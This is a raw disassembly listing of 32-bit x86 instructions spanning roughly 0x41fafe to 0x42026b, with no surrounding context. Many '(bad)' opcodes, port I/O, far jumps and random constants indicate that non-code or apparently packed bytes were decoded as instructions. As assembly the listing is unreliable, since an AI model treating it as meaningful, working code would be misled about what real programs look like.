  41fafe:	jmp    DWORD PTR [ebp-0x534688d]
  41fb04:	sub    al,0x17
  41fb06:	cmp    esi,0xffffffcf
  41fb09:	mov    ch,cl
  41fb0b:	ins    BYTE PTR es:[edi],dx
  41fb0c:	adc    BYTE PTR [ebx+0x1a],bh
  41fb0f:	xor    dh,dl
  41fb11:	ins    BYTE PTR es:[edi],dx
  41fb12:	(bad)  
  41fb13:	push   cs
  41fb14:	sti    
  41fb15:	sub    eax,0x15fff1e5
  41fb1a:	or     ebx,DWORD PTR ds:0xf9264215
  41fb20:	fld    QWORD PTR [eax+0x5076c6f]
  41fb26:	xchg   ebp,eax
  41fb27:	cmp    al,dl
  41fb29:	jmp    0x961982f4
  41fb2e:	add    BYTE PTR [ebp+0x1c929e44],dl
  41fb34:	inc    esi
  41fb35:	sbb    DWORD PTR [esi+0x18cab7e1],ebx
  41fb3b:	adc    eax,0x43987496
  41fb40:	push   ss
  41fb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb42:	rcr    BYTE PTR [ebx+0x8bac37f],cl
  41fb48:	xchg   edi,eax
  41fb49:	gs ja  0x41fb68
  41fb4c:	jae    0x41fae3
  41fb4e:	dec    esp
  41fb4f:	cdq    
  41fb50:	or     eax,ebx
  41fb52:	loope  0x41fb41
  41fb54:	jecxz  0x41fb41
  41fb56:	cdq    
  41fb57:	xor    al,BYTE PTR [edi+0x3e556d16]
  41fb5d:	pop    ebx
  41fb5e:	call   0xc901:0x780bc1dc
  41fb65:	push   ss
  41fb66:	out    dx,al
  41fb67:	sar    eax,0x56
  41fb6a:	ins    BYTE PTR es:[edi],dx
  41fb6b:	lock cmp ebp,ecx
  41fb6e:	stos   DWORD PTR es:[edi],eax
  41fb6f:	ss call 0xa520:0xd8540c14
  41fb77:	mov    dl,al
  41fb79:	pop    esi
  41fb7a:	std    
  41fb7b:	cmc    
  41fb7c:	sub    ah,ah
  41fb7e:	lds    esp,FWORD PTR [ebx]
  41fb80:	arpl   WORD PTR [edi+eax*4-0x6d],sp
  41fb84:	pop    esp
  41fb85:	not    esp
  41fb87:	inc    edx
  41fb88:	repnz sub BYTE PTR [eax+0x65],cl
  41fb8c:	xor    eax,eax
  41fb8e:	xchg   ebx,eax
  41fb8f:	loope  0x41fbae
  41fb91:	mov    esi,0x1fa76877
  41fb96:	test   eax,0x75bdc12f
  41fb9b:	add    dh,BYTE PTR [edi+0x2f6d4924]
  41fba1:	ror    DWORD PTR ds:0xc5698b2e,1
  41fba7:	push   eax
  41fba8:	in     al,0xc6
  41fbaa:	ins    BYTE PTR es:[edi],dx
  41fbab:	mov    al,0x6b
  41fbad:	enter  0xab56,0x35
  41fbb1:	stc    
  41fbb2:	rol    ebx,0x57
  41fbb5:	sub    DWORD PTR [ebx+0x7],ecx
  41fbb8:	ds mov bh,0xb
  41fbbb:	mov    ss,WORD PTR [edi-0x255b0ed5]
  41fbc1:	(bad)  
  41fbc2:	std    
  41fbc3:	adc    ah,BYTE PTR [ebp+0x2190232]
  41fbc9:	(bad)  
  41fbca:	call   0x370dbfaa
  41fbcf:	pusha  
  41fbd0:	cmc    
  41fbd1:	jno    0x41fc45
  41fbd3:	clc    
  41fbd4:	push   edx
  41fbd5:	faddp  st(7),st
  41fbd7:	xor    al,0xf7
  41fbd9:	mov    ecx,gs
  41fbdb:	push   ebx
  41fbdc:	push   cs
  41fbdd:	xchg   DWORD PTR [edi-0x44dbb714],eax
  41fbe3:	pop    esi
  41fbe4:	xlat   BYTE PTR ds:[ebx]
  41fbe5:	inc    ebx
  41fbe6:	enter  0x6b1f,0x5c
  41fbea:	(bad)  
  41fbed:	out    dx,al
  41fbee:	bound  eax,QWORD PTR [edi]
  41fbf0:	shl    BYTE PTR [esi],1
  41fbf2:	retf   0x91ac
  41fbf5:	mov    ah,0x7b
  41fbf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf8:	jnp    0x41fb9a
  41fbfa:	mov    ah,0xd2
  41fbfc:	xchg   edi,eax
  41fbfd:	fld    TBYTE PTR [esi+0x28]
  41fc00:	adc    DWORD PTR [edi-0x2b19b461],ecx
  41fc06:	push   es
  41fc07:	retf   
  41fc08:	clc    
  41fc09:	out    dx,eax
  41fc0a:	aad    0x9b
  41fc0c:	inc    esp
  41fc0d:	inc    ebp
  41fc0e:	aaa    
  41fc0f:	aas    
  41fc10:	arpl   WORD PTR [esp+eax*1+0x359ef724],bp
  41fc17:	and    BYTE PTR [ecx+0x42],0xe7
  41fc1b:	mov    dl,dh
  41fc1d:	mov    ecx,0x230f1d6
  41fc22:	jp     0x41fc80
  41fc24:	mov    ds:0xd517b008,al
  41fc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc2a:	loopne 0x41fc55
  41fc2c:	adc    ecx,DWORD PTR [edx-0x1d]
  41fc2f:	dec    ebp
  41fc30:	dec    edx
  41fc31:	mov    bh,0x35
  41fc33:	pop    eax
  41fc34:	inc    edx
  41fc35:	std    
  41fc36:	int    0xd8
  41fc38:	inc    ebx
  41fc39:	aas    
  41fc3a:	or     eax,0xcb5d5058
  41fc3f:	dec    ebx
  41fc40:	loopne 0x41fbed
  41fc42:	cmp    DWORD PTR [ebx+0x1e],ecx
  41fc45:	or     ch,BYTE PTR [edi+0x74]
  41fc48:	dec    edx
  41fc49:	mov    ds:0xf7f6867a,al
  41fc4e:	pop    edx
  41fc4f:	push   0xf4a117be
  41fc54:	into   
  41fc55:	mov    BYTE PTR [ebx-0x23a04960],ch
  41fc5b:	ins    BYTE PTR es:[edi],dx
  41fc5c:	mov    WORD PTR [eax+0x7c3ecc14],ss
  41fc62:	add    BYTE PTR [edi-0x3d654c75],bl
  41fc68:	push   0xffffffb1
  41fc6a:	push   edi
  41fc6b:	dec    edi
  41fc6c:	xchg   ebx,eax
  41fc6d:	fstp   TBYTE PTR [ebx]
  41fc6f:	add    bl,0xe7
  41fc72:	and    al,0x60
  41fc74:	lods   al,BYTE PTR ds:[esi]
  41fc75:	pop    es
  41fc76:	jno    0x41fce5
  41fc78:	push   esp
  41fc79:	(bad)  
  41fc7a:	pusha  
  41fc7b:	jno    0x41fc03
  41fc7d:	xor    dh,BYTE PTR ds:0xb44971
  41fc83:	and    BYTE PTR [esi],dl
  41fc85:	pop    esp
  41fc86:	push   es
  41fc87:	push   ds
  41fc88:	in     eax,0xc3
  41fc8a:	fadd   DWORD PTR [esi+0x2e]
  41fc8d:	stos   BYTE PTR es:[edi],al
  41fc8e:	arpl   sp,ax
  41fc90:	rcr    BYTE PTR gs:[eax+0x7a],cl
  41fc94:	mov    ebp,0x8d6fcf96
  41fc99:	lds    ebp,FWORD PTR [edx-0x42]
  41fc9c:	or     DWORD PTR [edi],edi
  41fc9e:	jae    0x41fd11
  41fca0:	mov    ds:0x5c2e9768,eax
  41fca5:	and    ebp,DWORD PTR [ebx-0x4922ed5]
  41fcab:	jbe    0x41fc64
  41fcad:	mov    ss,WORD PTR [eax-0x3eef6b14]
  41fcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcb4:	popf   
  41fcb5:	test   eax,esp
  41fcb7:	pop    edi
  41fcb8:	jnp    0x41fc8a
  41fcba:	fcom   QWORD PTR [edi-0xd]
  41fcbd:	or     eax,0x1cd45d7a
  41fcc2:	xor    bh,dh
  41fcc4:	scas   al,BYTE PTR es:[edi]
  41fcc5:	or     dh,BYTE PTR [ebp+0x18]
  41fcc8:	lahf   
  41fcc9:	inc    ebp
  41fcca:	lock mov BYTE PTR [eax+eiz*2],bl
  41fcce:	dec    edx
  41fccf:	jnp    0x41fd47
  41fcd1:	mov    WORD PTR [eax-0x74145be5],fs
  41fcd7:	inc    ecx
  41fcd8:	in     eax,dx
  41fcd9:	data16 test BYTE PTR [edx],ah
  41fcdc:	xchg   ecx,eax
  41fcdd:	push   ss
  41fcde:	into   
  41fcdf:	push   ds
  41fce0:	mov    ebp,0x6cf52d8c
  41fce5:	dec    ebx
  41fce6:	cmp    al,0xed
  41fce8:	stos   BYTE PTR es:[edi],al
  41fce9:	jge    0x41fd34
  41fceb:	fscale 
  41fced:	jns    0x41fd54
  41fcef:	sub    al,0xd5
  41fcf1:	retf   0x1588
  41fcf4:	leave  
  41fcf5:	out    dx,eax
  41fcf6:	jp     0x41fceb
  41fcf8:	inc    ebp
  41fcf9:	pop    eax
  41fcfa:	and    al,0xf2
  41fcfc:	in     eax,0x71
  41fcfe:	or     BYTE PTR [edx-0x4b],cl
  41fd01:	in     eax,0x10
  41fd03:	mov    ds:0x1f77fbb1,al
  41fd08:	call   0x7ab11094
  41fd0d:	lods   al,BYTE PTR ds:[esi]
  41fd0e:	sub    BYTE PTR [esi+0x0],bh
  41fd11:	cmp    ebp,ebp
  41fd13:	(bad)  
  41fd14:	push   cs
  41fd15:	inc    edi
  41fd16:	dec    esi
  41fd17:	sub    al,0x93
  41fd19:	jo     0x41fcc5
  41fd1b:	dec    eax
  41fd1c:	sti    
  41fd1d:	xchg   ebp,eax
  41fd1e:	gs fstp st(3)
  41fd21:	stos   BYTE PTR es:[edi],al
  41fd22:	push   ss
  41fd23:	outs   dx,DWORD PTR ds:[esi]
  41fd24:	imul   esp,DWORD PTR [edx+0x12594cb9],0x39
  41fd2b:	pop    ss
  41fd2c:	push   cs
  41fd2d:	add    BYTE PTR [eax+0x4f],bl
  41fd30:	inc    esi
  41fd31:	pusha  
  41fd32:	xchg   BYTE PTR [ecx],cl
  41fd34:	xor    al,BYTE PTR [edx+eax*4+0x24]
  41fd38:	outs   dx,BYTE PTR ds:[esi]
  41fd39:	repnz mov ah,bh
  41fd3c:	(bad)  [edi]
  41fd3e:	ss adc al,0x7a
  41fd41:	inc    ebp
  41fd42:	pop    ss
  41fd43:	pop    ds
  41fd44:	jbe    0x41fdaa
  41fd46:	adc    esi,edx
  41fd48:	mov    cl,0xb4
  41fd4a:	rol    BYTE PTR [eax+edi*2],1
  41fd4d:	repnz mov eax,0xfc6b56ba
  41fd53:	(bad)  
  41fd54:	xchg   esi,eax
  41fd55:	push   ebx
  41fd56:	in     al,dx
  41fd57:	mov    cl,0x2e
  41fd59:	xor    DWORD PTR [edx],0xfffffff7
  41fd5c:	add    ebx,ebx
  41fd5e:	cld    
  41fd5f:	adc    edi,DWORD PTR [eax+eiz*4]
  41fd62:	fcomp  DWORD PTR [esi+0x5e]
  41fd65:	xor    DWORD PTR [ebp+0x3a],edx
  41fd68:	in     al,dx
  41fd69:	mov    edi,DWORD PTR [ebx+0x1dc98e23]
  41fd6f:	sub    bh,al
  41fd71:	lods   al,BYTE PTR ds:[esi]
  41fd72:	or     BYTE PTR [eax+0x43],0x74
  41fd76:	inc    ebp
  41fd77:	and    eax,0xeaa821d
  41fd7c:	call   0x499b:0x41d1eb0e
  41fd83:	or     BYTE PTR [edx+0x7d],cl
  41fd86:	or     esi,DWORD PTR [eax-0x68859742]
  41fd8c:	sub    al,0x5e
  41fd8e:	jbe    0x9fcdf40f
  41fd94:	push   edx
  41fd95:	fistp  QWORD PTR [eax+0x6c66f061]
  41fd9b:	and    al,0x47
  41fd9d:	iret   
  41fd9e:	(bad)  
  41fd9f:	sbb    bl,al
  41fda1:	xchg   BYTE PTR [esi+edx*2],al
  41fda4:	in     al,0xb6
  41fda6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fda7:	lahf   
  41fda8:	ss ins BYTE PTR es:[edi],dx
  41fdaa:	dec    ebx
  41fdab:	stc    
  41fdac:	enter  0x6209,0x4c
  41fdb0:	test   BYTE PTR gs:[ebx],0x3
  41fdb4:	and    eax,0x802537ca
  41fdb9:	pop    edi
  41fdba:	mov    ah,0x3d
  41fdbc:	jle    0x41fdf4
  41fdbe:	jbe    0x41fdb1
  41fdc0:	xlat   BYTE PTR ds:[ebx]
  41fdc1:	and    eax,ebp
  41fdc3:	inc    ecx
  41fdc4:	imul   ebp,eax,0xffffff9f
  41fdc7:	jl     0x41fd85
  41fdc9:	adc    DWORD PTR [esi],0xfffffffe
  41fdcc:	out    0xa1,al
  41fdce:	dec    DWORD PTR [eax+0x59a19068]
  41fdd4:	mov    dh,BYTE PTR [esi-0x5b]
  41fdd7:	mov    ecx,0xd947afa8
  41fddc:	neg    DWORD PTR [ebp-0x5c]
  41fddf:	jno    0x41fde7
  41fde1:	mov    bl,0x7f
  41fde3:	and    al,0xd0
  41fde5:	xchg   DWORD PTR [edx-0x17],edi
  41fde8:	pop    ss
  41fde9:	jmp    ecx
  41fdeb:	pop    ebx
  41fdec:	mov    al,ds:0xa17ce2b3
  41fdf1:	push   edx
  41fdf2:	add    ch,dl
  41fdf4:	cmp    cl,BYTE PTR [ebp-0x52324469]
  41fdfa:	sbb    bl,BYTE PTR [esi+0x43808b6f]
  41fe00:	scas   eax,DWORD PTR es:[edi]
  41fe01:	xlat   BYTE PTR ds:[ebx]
  41fe02:	repnz idiv cl
  41fe05:	in     al,dx
  41fe06:	adc    al,0x4d
  41fe08:	xchg   BYTE PTR [esi],dl
  41fe0a:	iret   
  41fe0b:	cmp    bl,BYTE PTR [edi-0x61]
  41fe0e:	out    0xde,al
  41fe10:	stos   BYTE PTR es:[edi],al
  41fe11:	sbb    BYTE PTR ss:[edi-0x2707c42e],bh
  41fe18:	out    dx,eax
  41fe19:	inc    ecx
  41fe1a:	add    eax,DWORD PTR [edi+0x47]
  41fe1d:	shl    DWORD PTR [ecx+ebx*4+0x36],cl
  41fe21:	sbb    eax,0x8bcdb1fa
  41fe26:	adc    DWORD PTR [edi+0xb],0x65
  41fe2a:	mov    ds:0x423af6ab,eax
  41fe2f:	cmp    al,0x11
  41fe31:	popf   
  41fe32:	mov    BYTE PTR [ecx+0x5aa366af],ah
  41fe38:	jmp    0x7c7cf732
  41fe3d:	mov    ebp,DWORD PTR [edi+0x2e4c9cd3]
  41fe43:	call   0xa010dc74
  41fe48:	ins    DWORD PTR es:[edi],dx
  41fe49:	mov    edi,0xd886262d
  41fe4e:	(bad)  
  41fe4f:	cmp    al,bl
  41fe51:	adc    al,0x8b
  41fe53:	mov    eax,ds:0x3c47945
  41fe58:	fmul   QWORD PTR [ecx-0x771c3254]
  41fe5e:	mov    bl,0xd
  41fe60:	lods   al,BYTE PTR ds:[esi]
  41fe61:	xchg   BYTE PTR [eax],ah
  41fe63:	aaa    
  41fe64:	xchg   esp,eax
  41fe65:	or     al,0x48
  41fe67:	pop    ss
  41fe68:	mov    eax,ds:0xcde05fea
  41fe6d:	inc    edi
  41fe6e:	sbb    eax,DWORD PTR ds:0x4b91ed17
  41fe74:	mov    ebx,0x6729fdcf
  41fe79:	cs mov esp,0x6ed4e164
  41fe7f:	lock xchg edx,eax
  41fe81:	lahf   
  41fe82:	test   BYTE PTR [eax-0x534b84aa],bh
  41fe88:	fs jbe 0x41feb1
  41fe8b:	push   0xffffff95
  41fe8d:	jmp    0x5c01:0x9966bd43
  41fe94:	cwde   
  41fe95:	ret    0x8003
  41fe98:	ins    BYTE PTR es:[edi],dx
  41fe99:	mov    esp,0xef22a474
  41fe9e:	es out 0xc9,eax
  41fea1:	or     BYTE PTR [ebp-0x6667a9b5],al
  41fea7:	xor    al,0x2a
  41fea9:	mov    ds:0x13b9fde6,al
  41feae:	add    BYTE PTR [ecx+0x2c],0x51
  41feb2:	daa    
  41feb3:	imul   edx,DWORD PTR [esi],0x8c3bd886
  41feb9:	out    0x8a,eax
  41febb:	in     eax,dx
  41febc:	mov    ebp,0x8fac921e
  41fec1:	jle    0x41fe82
  41fec3:	nop
  41fec4:	sar    DWORD PTR [ecx+ecx*4-0x10],0xe5
  41fec9:	jg     0x41fe80
  41fecb:	sub    al,0x4e
  41fecd:	mov    esp,DWORD PTR [ebp+0x2e]
  41fed0:	arpl   WORD PTR [eax-0x18],ax
  41fed3:	(bad)  
  41fed5:	mov    dl,0xad
  41fed7:	ja     0x41fe70
  41fed9:	or     bl,BYTE PTR [esi-0x5f]
  41fedc:	fucomip st,st(5)
  41fede:	xchg   ecx,eax
  41fedf:	cld    
  41fee0:	and    DWORD PTR [esi],eax
  41fee2:	repz cdq 
  41fee4:	jb     0x41fe9f
  41fee6:	fisubr DWORD PTR [edi]
  41fee8:	sub    ebp,edi
  41feea:	out    0x6c,al
  41feec:	cmp    BYTE PTR [ecx],bl
  41feee:	xchg   ebp,eax
  41feef:	sysexit 
  41fef1:	xor    BYTE PTR [edx-0x7adc9000],0x24
  41fef8:	hlt    
  41fef9:	pop    ds
  41fefa:	aam    0xf2
  41fefc:	enter  0x16d3,0xc3
  41ff00:	ds iret 
  41ff02:	and    BYTE PTR [ebx+0x21d04092],al
  41ff08:	mov    ebp,0xda27c2e6
  41ff0d:	stc    
  41ff0e:	sbb    DWORD PTR [edx+0x38e408a],esi
  41ff14:	xchg   esp,esi
  41ff16:	out    0x9a,al
  41ff18:	test   eax,0x7046512e
  41ff1d:	push   eax
  41ff1e:	out    dx,eax
  41ff1f:	xchg   esp,eax
  41ff20:	pusha  
  41ff21:	xchg   esp,eax
  41ff22:	aad    0x60
  41ff24:	and    ch,BYTE PTR [edi+0x60cc37e9]
  41ff2a:	dec    edx
  41ff2b:	pop    edi
  41ff2c:	bound  ebx,QWORD PTR [ebx]
  41ff2e:	ins    DWORD PTR es:[edi],dx
  41ff2f:	cmp    DWORD PTR [ebp+0x4],ebp
  41ff32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff33:	and    bh,BYTE PTR [edi+eiz*1+0x67]
  41ff37:	pop    ds
  41ff38:	inc    edx
  41ff39:	xchg   esp,eax
  41ff3a:	cli    
  41ff3b:	jmp    0x47e8:0xdb424f2c
  41ff42:	xchg   bp,ax
  41ff44:	(bad)  
  41ff45:	into   
  41ff46:	fld    QWORD PTR [ecx+0x16]
  41ff49:	aas    
  41ff4a:	and    al,0xe6
  41ff4c:	iret   
  41ff4d:	push   esp
  41ff4e:	imul   ebp,ebx,0x55
  41ff51:	sub    eax,0xa95d91c0
  41ff56:	jl     0x41ff51
  41ff58:	xlat   BYTE PTR ds:[ebx]
  41ff59:	pop    edx
  41ff5a:	sbb    al,0xa5
  41ff5c:	sbb    al,0x55
  41ff5e:	xchg   ebx,eax
  41ff5f:	bound  esp,QWORD PTR [esi]
  41ff61:	lahf   
  41ff62:	dec    BYTE PTR [edx]
  41ff64:	(bad)  
  41ff65:	mov    ebx,0xe9f769a
  41ff6a:	into   
  41ff6b:	cmp    cl,BYTE PTR [ebx]
  41ff6d:	test   eax,0xda8d8db2
  41ff72:	xchg   DWORD PTR [ebx+0x3ad0a0c6],ecx
  41ff78:	cmp    al,0x70
  41ff7a:	fsubr  DWORD PTR [edx+0x10]
  41ff7d:	xchg   esi,eax
  41ff7e:	mov    al,BYTE PTR [ecx-0x60fadacf]
  41ff84:	test   DWORD PTR [esi-0x51a7167a],eax
  41ff8a:	scas   eax,DWORD PTR es:[edi]
  41ff8b:	sbb    eax,0xa2339271
  41ff90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff91:	adc    DWORD PTR [ecx+0x165763a2],ecx
  41ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff98:	(bad)  
  41ff99:	push   ecx
  41ff9a:	xchg   ecx,eax
  41ff9b:	xor    DWORD PTR [ecx+0x4e],esp
  41ff9e:	rol    DWORD PTR [ecx+0x67c1d79f],0x4b
  41ffa5:	(bad)  
  41ffa6:	rcl    BYTE PTR [ebp-0x19],1
  41ffa9:	mov    eax,DWORD PTR [eax-0x652993d0]
  41ffaf:	sub    bh,BYTE PTR [edi+0x58]
  41ffb2:	push   ds
  41ffb3:	imul   esi
  41ffb5:	test   al,0xb1
  41ffb7:	and    eax,0xdc39d360
  41ffbc:	add    BYTE PTR [ebp+0x77a8f908],cl
  41ffc2:	cwde   
  41ffc3:	xchg   edx,eax
  41ffc4:	sti    
  41ffc5:	sbb    esi,esp
  41ffc7:	or     edx,DWORD PTR [ebx+0x3a9e352a]
  41ffcd:	stc    
  41ffce:	aam    0x55
  41ffd0:	dec    edi
  41ffd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffd2:	fidiv  DWORD PTR [ecx+ecx*2]
  41ffd5:	sti    
  41ffd6:	(bad)  
  41ffd8:	mov    ebx,0x53679470
  41ffdd:	scas   al,BYTE PTR es:[edi]
  41ffde:	clc    
  41ffdf:	sbb    eax,0x3afec70
  41ffe4:	or     eax,0x925f9bbe
  41ffe9:	icebp  
  41ffea:	gs mov edx,0x4bffbb07
  41fff0:	nop
  41fff1:	pop    ebp
  41fff2:	stos   BYTE PTR es:[edi],al
  41fff3:	or     edi,ebx
  41fff5:	idiv   DWORD PTR cs:[eax]
  41fff8:	int    0x88
  41fffa:	jg     0x41ffbc
  41fffc:	rcr    BYTE PTR [eax],0xf8
  41ffff:	leave  
  420000:	add    eax,0xc90ba00
  420005:	sbb    BYTE PTR [eax+0x1faff6e0],ch
  42000b:	fistp  WORD PTR [eax+ebx*4+0x56]
  42000f:	pop    edx
  420010:	xor    DWORD PTR [esi+edi*4],edx
  420013:	inc    esi
  420014:	cmp    DWORD PTR [ecx],ebx
  420016:	sub    eax,0x6b6abfba
  42001b:	test   al,0x63
  42001d:	enter  0xa0c5,0x72
  420021:	fdivp  st(4),st
  420023:	cdq    
  420024:	pop    eax
  420025:	outs   dx,DWORD PTR ds:[esi]
  420026:	lea    eax,gs:[eax+0x4e]
  42002a:	and    eax,0xd5c3dc59
  42002f:	pusha  
  420030:	sar    BYTE PTR [ebp+0x46],0x2c
  420034:	test   eax,0x29d40e00
  420039:	(bad)  
  42003a:	rol    BYTE PTR [ebx+0x7d2d0c6d],1
  420040:	shl    DWORD PTR [eiz*2-0x4fabef8],cl
  420047:	mov    al,0xe
  420049:	add    eax,0x57e331d0
  42004e:	lods   al,BYTE PTR ds:[esi]
  42004f:	mov    DWORD PTR [ebp+0x53],ecx
  420052:	in     eax,0x2f
  420054:	sbb    bh,BYTE PTR [ebp+0x17c9cb4]
  42005a:	in     eax,dx
  42005b:	dec    ebx
  42005c:	jbe    0x420086
  42005e:	dec    cl
  420060:	mov    ebp,0xa9144750
  420065:	dec    ebx
  420066:	cld    
  420067:	mov    esi,0xf45fb95a
  42006c:	ss mov ebp,0x2e0357b
  420072:	mov    al,0x8d
  420074:	int3   
  420075:	je     0x4200e7
  420077:	sub    ch,BYTE PTR ds:0xf58a24c1
  42007d:	jae    0x420033
  42007f:	cmp    DWORD PTR [edx+0x62],eax
  420082:	sub    al,0xd9
  420084:	jmp    0xe48b:0xf223b641
  42008b:	jo     0x4200c2
  42008d:	mov    ds:0xd9653979,eax
  420092:	mov    DWORD PTR [ebx-0x5b],esi
  420095:	sub    esi,DWORD PTR [ebx]
  420097:	push   es
  420098:	int    0x11
  42009a:	jb     0x4200f3
  42009c:	mov    cl,0xdd
  42009e:	or     BYTE PTR [di+0x778],ch
  4200a3:	push   cs
  4200a4:	shl    BYTE PTR [ecx-0x7e],cl
  4200a7:	aaa    
  4200a8:	imul   eax,ebx,0x33
  4200ab:	dec    edx
  4200ac:	ror    DWORD PTR [eax+0x69],cl
  4200af:	jbe    0x4200d7
  4200b1:	cmp    edx,ebx
  4200b3:	adc    ebp,DWORD PTR [edi+0x1a]
  4200b6:	sub    al,0x32
  4200b8:	sub    DWORD PTR [edx],edx
  4200ba:	mov    edx,0x5c3688ed
  4200bf:	(bad)  
  4200c0:	sub    BYTE PTR [ebx+0x19d9bfc3],ch
  4200c6:	add    al,BYTE PTR ds:0xc6c2d33
  4200cc:	or     ebp,ebp
  4200ce:	sbb    BYTE PTR [ecx],cl
  4200d0:	add    al,0x26
  4200d2:	out    0x37,al
  4200d4:	adc    cl,BYTE PTR [ebx]
  4200d6:	pop    ss
  4200d7:	or     al,dl
  4200d9:	fs dec eax
  4200db:	push   cs
  4200dc:	retf   0x25aa
  4200df:	dec    edi
  4200e0:	cwde   
  4200e1:	inc    esp
  4200e2:	mov    WORD PTR [ebx-0x64],fs
  4200e5:	or     al,0x75
  4200e7:	imul   ebx,eax,0x1e539b01
  4200ed:	aaa    
  4200ee:	(bad)  
  4200ef:	fdiv   QWORD PTR [esi+0x4a098e1c]
  4200f5:	in     eax,dx
  4200f6:	test   DWORD PTR [eax-0x12],0xeaaae3c6
  4200fd:	jne    0x420145
  4200ff:	sub    eax,0xec2467d7
  420104:	(bad)  
  420105:	in     eax,dx
  420106:	dec    ecx
  420107:	mov    bl,0xd1
  420109:	add    ah,BYTE PTR [esp+ecx*1+0x58]
  42010d:	outs   dx,BYTE PTR ds:[esi]
  42010e:	call   0xbb4a9b89
  420113:	xchg   BYTE PTR [ebx],bl
  420115:	sub    DWORD PTR [edi+ebx*1],edx
  420118:	sub    esp,ebp
  42011a:	sbb    eax,0x7c07405
  42011f:	(bad)  
  420120:	jl     0x4200c7
  420122:	jno    0x4200f6
  420124:	fsubr  QWORD PTR [eax-0x7b]
  420127:	sti    
  420128:	cmp    DWORD PTR ds:0xf8888030,eax
  42012e:	bound  esp,QWORD PTR [ebx+esi*2-0x7b1c0195]
  420135:	popf   
  420136:	ja     0x420173
  420138:	and    dh,BYTE PTR [esp+ecx*2+0x19580303]
  42013f:	cmp    al,0xd3
  420141:	shl    DWORD PTR [eax-0x6f254a8b],cl
  420147:	cmp    ebx,DWORD PTR [esi+0x66]
  42014a:	mov    edx,0xd34c2b9
  42014f:	xchg   esi,eax
  420150:	add    bl,BYTE PTR [eax-0x54]
  420153:	jae    0x4201c8
  420155:	pop    ss
  420156:	sub    bl,al
  420158:	js     0x420184
  42015a:	aas    
  42015b:	mov    BYTE PTR [edi-0x55],bl
  42015e:	fidiv  WORD PTR [edx]
  420160:	gs push ss
  420162:	pop    es
  420163:	jne    0x4201d2
  420165:	adc    al,bl
  420167:	ja     0x420100
  420169:	ficom  WORD PTR ss:[esi+0x1c]
  42016d:	ins    BYTE PTR es:[edi],dx
  42016e:	pop    edx
  42016f:	imul   edx,DWORD PTR [edx],0xf7e4cb52
  420175:	sbb    bh,bh
  420177:	(bad)  
  420178:	jne    0x420141
  42017a:	sub    al,BYTE PTR [ecx-0x4f]
  42017d:	mov    es,WORD PTR cs:[edi-0x7a62af53]
  420184:	dec    ebx
  420185:	leave  
  420186:	mov    ch,BYTE PTR [edi-0x1c]
  420189:	pop    ebp
  42018a:	outs   dx,DWORD PTR ds:[esi]
  42018b:	xchg   esi,eax
  42018c:	leave  
  42018d:	leave  
  42018e:	mov    bh,0xc9
  420190:	cwde   
  420191:	or     edi,DWORD PTR [ebp-0x7de72de4]
  420197:	fnsave [ebx-0x5312f1b5]
  42019d:	xchg   BYTE PTR [esi],ch
  42019f:	sbb    DWORD PTR [esi+0x66],esp
  4201a2:	stc    
  4201a3:	daa    
  4201a4:	lds    esp,FWORD PTR [edi]
  4201a6:	pop    ds
  4201a7:	sub    dh,BYTE PTR [edi]
  4201a9:	sbb    al,0xed
  4201ab:	pop    es
  4201ac:	lock data16 jecxz 0x420156
  4201b0:	sub    eax,0x3ac747cf
  4201b5:	push   ebp
  4201b6:	add    ebp,DWORD PTR [edi+0x72]
  4201b9:	push   es
  4201ba:	cs das 
  4201bc:	sar    edi,cl
  4201be:	xchg   edx,eax
  4201bf:	shl    BYTE PTR [edx+0x3],cl
  4201c2:	inc    ecx
  4201c3:	mov    DWORD PTR [eax],edi
  4201c5:	cdq    
  4201c6:	nop
  4201c7:	cmp    eax,0x91ad5be8
  4201cc:	inc    eax
  4201cd:	shl    DWORD PTR [edi],1
  4201cf:	mov    bh,0x56
  4201d1:	daa    
  4201d2:	mov    WORD PTR [ecx+0x67],ss
  4201d5:	repnz out dx,al
  4201d7:	js     0x4201f6
  4201d9:	dec    esp
  4201da:	lds    edi,FWORD PTR [ebx+0x5f]
  4201dd:	mov    ecx,0xfa4405ff
  4201e2:	push   ecx
  4201e3:	(bad)  
  4201e4:	sub    BYTE PTR [ebx+0x5a6f344],bl
  4201ea:	jge    0x4201a4
  4201ec:	inc    edx
  4201ed:	cmp    BYTE PTR [ebx+eiz*2+0x71ef4fef],al
  4201f4:	gs cli 
  4201f6:	dec    ebp
  4201f7:	xchg   DWORD PTR [ecx],ebp
  4201f9:	cwde   
  4201fa:	adc    eax,0x6fcdde06
  4201ff:	inc    esp
  420200:	adc    edi,DWORD PTR [esi+0x441103a2]
  420206:	lahf   
  420207:	mov    esi,0x1caab265
  42020c:	pushf  
  42020d:	jns    0x420247
  42020f:	sub    eax,DWORD PTR [ecx]
  420211:	adc    al,0xf
  420213:	ret    0x2ea6
  420216:	push   cs
  420217:	mov    edi,0xe501a730
  42021c:	mov    ecx,0x3ed06e23
  420221:	xor    eax,0x3299400e
  420226:	out    0x1b,al
  420228:	loopne 0x4201c4
  42022a:	pop    ebx
  42022b:	retf   
  42022c:	sti    
  42022d:	pop    edi
  42022e:	jle    0x4201cb
  420230:	mov    al,0x42
  420232:	jns    0x4201f7
  420234:	add    al,0x34
  420236:	call   0x4eace7d6
  42023b:	iret   
  42023c:	in     eax,dx
  42023d:	aas    
  42023e:	xchg   esi,eax
  42023f:	sahf   
  420240:	dec    eax
  420241:	inc    ebx
  420242:	mov    eax,0x87aa7b34
  420247:	sar    BYTE PTR ds:0x4ffb6a57,cl
  42024d:	xchg   edx,eax
  42024e:	addr16 dec ebp
  420250:	jp     0x420243
  420252:	ficomp DWORD PTR [edx-0x4b9f4329]
  420258:	clc    
  420259:	adc    eax,0x136ae091
  42025e:	jns    0x420219
  420260:	enter  0xfcce,0x24
  420264:	std    
  420265:	(bad)  
  420266:	into   
  420267:	jbe    0x4202ce
  420269:	les    ebx,FWORD PTR [edx]
  42026b:	adc    ecx,DWORD PTR [edx]
